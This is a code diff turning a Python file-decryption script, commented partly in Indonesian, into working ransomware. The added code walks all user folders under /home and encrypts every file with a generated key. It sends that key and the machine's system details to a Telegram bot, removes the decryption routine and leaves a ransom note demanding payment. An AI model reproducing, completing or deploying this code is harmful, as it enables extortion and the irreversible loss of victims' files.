@@ -1,7 +1,8 @@
 #!/usr/bin/python3
-
 import os
 from cryptography.fernet import Fernet
+import requests
+import platform as pl
 
 a = "/home"
 os.chdir(a)
@@ -9,11 +10,15 @@ user = os.listdir() #collect user folder
 
 print(user)
 
+ransompath = "GOTCHA/"
+
+if os.path.exists(ransompath) == False :
+	os.mkdir("GOTCHA")
+
 
 
 #deklarasi kunci
-inputkunci = bytes(input("masukkan kunci untuk dekripsi\t: "), 'utf-8')
-
+kunci = Fernet.generate_key()
 
 #list store
 folpath = [] #where to store user folder content path
@@ -25,9 +30,15 @@ def filecol(fdlist, fol1, file) :
 		child = os.listdir(path)
 		print(child)
 
-		
+
 		for item in child :
 			abpath = f'{os.path.abspath(path)}/{item}'
+
+			if "NAMA FILE YANG INGIN DI SKIP, KALAU ADA" == item :
+				print("DONT")
+				continue
+
+
 			if os.path.isfile(abpath):
 				print("list file", file)
 				file.append(abpath)
@@ -49,7 +60,7 @@ def filecol2(folpath,filepath) :
 		for content in child :
 			abpath = f'{os.path.abspath(folder)}/{content}'
 
-			if "nama file yang ingin di skip" in abpath :
+			if "NAMA FILE YANG INGIN DI SKIP, KALAU ADA" == content :
 				print("DONT MESS WITH IT")
 				continue
 
@@ -62,36 +73,65 @@ def filecol2(folpath,filepath) :
 #i think the reason why i don't need a recursive function is because i append the folder path and it makes everysingle folder in this machine would be added 
 #how lucky i am :DD
 
+#unnecesary check for read binary
 
-def Decrypt(filepath, kunci) :
-	kata = "hate"
-	inputa = input("kata kunci : ")
-	if inputa == kata :
-		for file in filepath :
-			try :
-				with open(file, "rb") as act : 
-					content = act.read()
-				encryptedct = Fernet(kunci).decrypt(content) #IT'S IMPORTANT TO REMEMBER THAT THE KUNCI ARE BEING USED IS NOT THE ONE THAT WRITTEN IN GOTCHA FILE BUT THE BIN VAL OF THAT FILE
-	
-				with open(file, "wb") as isi :
-					isi.write(encryptedct)
-	
-				print("decrypting", file)
+def Encrypt(filepath, kunci):
+	for file in filepath :
+		try :
 
-			except :
-				print("GAGAL MENGDEKRIPSI FILE", file)
-				continue
+			with open(file, "rb") as act : 
+				content = act.read()
 
-	else :
-		pass
+			encryptedct = Fernet(kunci).encrypt(content)
+
+			with open(file, "wb") as isi :
+				isi.write(encryptedct)
+
+
+		except OSError:
+			continue
+
+	telegram(kunci)
+
+def telegram(kunci) :
+	#deklarasi variabel :D
+	TOKEN = "TOKEN DARI BOT FATHER BALBLBALBA"
+	strkunci = str(kunci, 'utf-8')
+	message = f"the string key is {strkunci}"
+	idchat = "id chat dari json"
+
+
+	#system info
+	platform = pl.platform()
+	node = pl.node()
+	rl = pl.release()
+	ver = pl.version()
+	machine = pl.machine()
+	uname = os.uname()
+
+	message0 = "WE GOT A FISH"
+	message1 = f"platform\t: {platform}"
+	message2 = f"node\t: {node}"
+	message3 = f"release\t: {rl}"
+	message4 = f"versioin\t: {ver}"
+	message5 = f"machine\t: {machine}"
+	message6 = f"uname\t: {uname}"
+	message7 = f"key\t: {strkunci}"
+	msglist = [message0, message1, message2, message3, message4, message5, message6, message7]
+
+	for msg in msglist:
+		url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={idchat}&text={msg}"
+		r = requests.get(url)
+
+
+
+
 
 
 filecol(user, folpath,filepath)
 
-#filecol2(folpath,filepath)
+Encrypt(filepath,kunci)
 
-print(folpath)
-print(filepath)
-print("panjang folpath",len(folpath))
-print("panjang filepath", len(filepath))
-Decrypt(filepath, inputkunci) 
+with open(f"{ransompath}/msg.txt", 'w') as msg :
+	msg.write("all your file been encrypted, contact me if you want the key. Oh don't forget to prepare the money :D")
+
